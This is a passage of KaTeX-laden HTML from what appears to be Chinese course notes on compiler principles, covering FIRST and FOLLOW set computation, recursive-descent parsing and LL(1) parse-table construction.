style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mclose">)</span><span class="mord cjk_fallback">；</span></span></span></span></eq></li></ol></li><li><ol start="3"><li>若<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi><mo>≠</mo><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\alpha\not=\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="inner"><span class="mord"><span class="mrel"></span></span></span><span class="fix"></span></span></span></span></span></span><span class="base"><span class="strut" style="height:0.3669em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">ϵ</span></span></span></span></eq>,且<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>X</mi><mn>1</mn></msub><msub><mi>X</mi><mn>2</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>X</mi><mi>n</mi></msub><msup><mo>→</mo><mo lspace="0em" rspace="0em">∗</mo></msup><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">X_1X_2..X_n\rightarrow^{*}\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8387em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">..</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">→</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∗</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">ϵ</span></span></span></span></eq>,则<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><msub><mi>X</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>−</mo><mo stretchy="false">{</mo><mi>ϵ</mi><mo stretchy="false">}</mo><mo>⊂</mo><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>α</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">FIRST(X_i)-\{\epsilon\}\subset FIRST(\alpha)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathnormal">ϵ</span><span class="mclose">}</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⊂</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mclose">)</span></span></span></span></eq></li></ol></li><li><ol start="4"><li>若<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi><mo>≠</mo><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\alpha\not =\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="inner"><span class="mord"><span class="mrel"></span></span></span><span class="fix"></span></span></span></span></span></span><span class="base"><span class="strut" style="height:0.3669em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">ϵ</span></span></span></span></eq>,且<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>X</mi><mn>1</mn></msub><msub><mi>X</mi><mn>2</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>X</mi><mi>n</mi></msub><msup><mo>→</mo><mo lspace="0em" rspace="0em">∗</mo></msup><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">X_1X_2..X_n\rightarrow^{*}\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8387em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">..</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">→</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∗</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">ϵ</span></span></span></span></eq>，则<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi><mo>∈</mo><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>α</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\epsilon \in FIRST(\alpha)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">ϵ</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mclose">)</span></span></span></span></eq><br><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/FIRST%E9%9B%86%E5%90%88%E7%9A%84%E6%B1%82%E6%B3%95.jpg" alt="FIRST集合的求法"></li></ol></li></ul></li></ul></li><li><p>计算FOLLOW集合</p><ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>O</mi><mi>L</mi><mi>L</mi><mi>O</mi><mi>W</mi><mo stretchy="false">(</mo><mi>U</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">FOLLOW(U)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">FO</span><span class="mord mathnormal">LL</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mclose">)</span></span></span></span></eq>的求法，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>O</mi><mi>L</mi><mi>L</mi><mi>O</mi><mi>W</mi><mo stretchy="false">(</mo><mi>U</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><mi>a</mi><mi mathvariant="normal">∣</mi><mi>S</mi><msup><mo>→</mo><mo lspace="0em" rspace="0em">∗</mo></msup><mo>…</mo><mi>U</mi><mi>a</mi><mo>…</mo><mo separator="true">,</mo><mi>a</mi><mo>∈</mo><msub><mi>V</mi><mi>T</mi></msub><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">FOLLOW(U)=\{a|S\rightarrow^{*}\dots Ua\dots,a\in V_T\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">FO</span><span class="mord mathnormal">LL</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathnormal">a</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">→</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∗</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">}</span></span></span></span></eq>,该定义中，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi></mrow><annotation encoding="application/x-tex">U</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span></span></span></span></eq>必须从S推得才能有<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>O</mi><mi>L</mi><mi>L</mi><mi>O</mi><mi>W</mi><mtext>集合</mtext></mrow><annotation encoding="application/x-tex">FOLLOW集合</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">FO</span><span class="mord mathnormal">LL</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord cjk_fallback">集合</span></span></span></span></eq></li><li><ol><li>对于文法的开始/识别符号S，令<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">$</mi><mo>∈</mo><mi>F</mi><mi>O</mi><mi>L</mi><mi>L</mi><mi>O</mi><mi>W</mi><mo stretchy="false">(</mo><mi>S</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\$\in FOLLOW(S)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8056em;vertical-align:-0.0556em;"></span><span class="mord">$</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">FO</span><span class="mord mathnormal">LL</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mclose">)</span></span></span></span></eq></li></ol></li><li><ol start="2"><li>$ A \rightarrow \alpha B \beta <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>则，</mtext></mrow><annotation encoding="application/x-tex">则，</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">则，</span></span></span></span></eq>FIRST(\beta)<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>中的非</mtext></mrow><annotation encoding="application/x-tex">中的非</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">中的非</span></span></span></span></eq>\epsilon<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>元素属于</mtext></mrow><annotation encoding="application/x-tex">元素属于</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">元素属于</span></span></span></span></eq>FOLLOW(B)$</li></ol></li><li><ol start="3"><li>$ A \rightarrow \alpha B <eq><span class="katex-error" title="ParseError: KaTeX parse error: Can&#x27;t use function &#x27;$1#x27; in math mode at position 4: ，或 $̲A\rightarrow \a…" style="color:#cc0000"><span class="cjk_fallback">，或 $A\rightarrow \alpha B \beta</span></span></eq>，而 $ FIRST(\beta) <eq><span class="katex-error" title="ParseError: KaTeX parse error: Can&#x27;t use function &#x27;$1#x27; in math mode at position 4: 含有 $̲ \epsilon $ ，则" style="color:#cc0000"><span class="cjk_fallback">含有 $ \epsilon $ ，则</span></span></eq> FOLLOW(A) $ 的元素属于$ FOLLOW(B) $<br><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/FOLLOW%E9%9B%86%E5%90%88%E7%9A%84%E6%B1%82%E6%B3%95.jpg" alt="FOLLOW集合的求法"></li></ol></li></ul></li></ul><h3 id="4-%E9%A2%84%E6%B5%8B%E5%88%86%E6%9E%90%E5%99%A8%E7%9A%84%E6%9E%84%E9%80%A0" tabindex="-1">4 预测分析器的构造</h3><h4 id="%E9%80%92%E5%BD%92%E5%AD%90%E7%A8%8B%E5%BA%8F%E6%B3%95" tabindex="-1">递归子程序法</h4><ul><li>基本思想：对真实推导过程的直接模拟</li><li>约定：每进入一个分析子程序前，已读到该子程序相应的非终结符号推导出的第一个终结符号/终结首符号。<ul><li>例如，当读到IF语句的第一个单词IF时，便知道将要进行IF语句的识别，于是调用对应于&lt;IF条件语句&gt;的分析子程序进行分析</li></ul></li><li>例子：<img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/%E5%88%86%E6%9E%90%E5%AD%90%E7%A8%8B%E5%BA%8F%E6%B3%95%E4%BE%8B%E5%AD%90.jpg" alt="分析子程序法例子"></li></ul><h4 id="%E7%A1%AE%E5%AE%9A%E7%9A%84ll(1)%E5%88%86%E6%9E%90%E5%99%A8" tabindex="-1">确定的LL(1)分析器</h4><ul><li><p>LL(1)文法：</p><ul><li>从左到右扫描输入符号串，从开始符号出发生成句子的最左推导。对于形如 U→α1|α2|…|αn 的产生式，只要向输入符号串中查看一个输入符号，便能惟一确定当前应选择的产生式，由此而得名LL(1)分析法。</li><li>当需要向输入串中查看K个输入符号，才能惟一确定当前应选择的产生式时，称为LL(K)分析法</li></ul></li><li><p>分析器程序结构：一张分析表M和一个符号栈S</p><ul><li>分析表的元素<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo stretchy="false">[</mo><mi>U</mi><mtext>，</mtext><mi>a</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">M[U，a]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">a</span><span class="mclose">]</span></span></span></span></eq>为一条关于该非终结符号U的产生式，指出当该非终结符号U面临输入符号a时应选择的产生式，分析表的元素也可能是一个出错标志，指出非终结符号U不能面临终结符号a。</li><li>符号栈S用于存放文法的符号，当文法和待分析的符号串确定后，符号栈的内容随分析过程而不断变化。开始时，栈底放“$”，假定输入符号串以“$”结束。</li></ul></li><li><p>分析过程：<br><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/LL(1)%E5%88%86%E6%9E%90%E5%99%A8%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B%E4%B8%BE%E4%BE%8B1.jpg" alt><br><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/LL(1)%E5%88%86%E6%9E%90%E5%99%A8%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B%E4%B8%BE%E4%BE%8B2.jpg" alt></p></li><li><p>分析表的构造</p><ul><li><ol><li>对<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>α</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">FIRST(\alpha)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mclose">)</span></span></span></span></eq>中的每一个终结符号<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span></eq>,置<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo stretchy="false">[</mo><mi>A</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">]</mo><mo>=</mo><mi mathvariant="normal">&quot;</mi><mi>A</mi><mo>→</mo><mi>α</mi><mi mathvariant="normal">&quot;</mi></mrow><annotation encoding="application/x-tex">M[A,a]=&quot;A\rightarrow\alpha&quot;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mopen">[</span><span class="mord mathnormal">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">&quot;</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mord">&quot;</span></span></span></span></eq></li></ol></li><li><ol start="2"><li>如果<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi><mo>∈</mo><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mo stretchy="false">(</mo><mi>α</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\epsilon \in FIRST(\alpha)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">ϵ</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">RST</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mclose">)</span></span></span></span></eq>,则对于属于<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>O</mi><mi>L</mi><mi>L</mi><mi>O</mi><mi>W</mi><mo stretchy="false">(</mo><mi>A</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">FOLLOW(A)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">FO</span><span class="mord mathnormal">LL</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mclose">)</span></span></span></span></eq>的每一个终结符号<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span></eq>或<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">$</mi></mrow><annotation encoding="application/x-tex">\$</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8056em;vertical-align:-0.0556em;"></span><span class="mord">$</span></span></span></span></eq>,分别置<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo stretchy="false">[</mo><mi>A</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">]</mo><mo>=</mo><mi mathvariant="normal">&quot;</mi><mi>A</mi><mo>→</mo><mi>α</mi><mi mathvariant="normal">&quot;</mi></mrow><annotation encoding="application/x-tex">M[A,b]=&quot;A\rightarrow\alpha&quot;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mopen">[</span><span class="mord mathnormal">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">&quot;</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mord">&quot;</span></span></span></span></eq>和<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo stretchy="false">[</mo><mi>A</mi><mo separator="true">,</mo><mi mathvariant="normal">$</mi><mo stretchy="false">]</mo><mo>=</mo><mi mathvariant="normal">&quot;</mi><mi>A</mi><mo>→</mo><mi>α</mi><mi mathvariant="normal">&quot;</mi></mrow><annotation encoding="application/x-tex">M[A,\$]=&quot;A\rightarrow\alpha&quot;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mopen">[</span><span class="mord mathnormal">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">$</span><span class="mclose">]</span><span 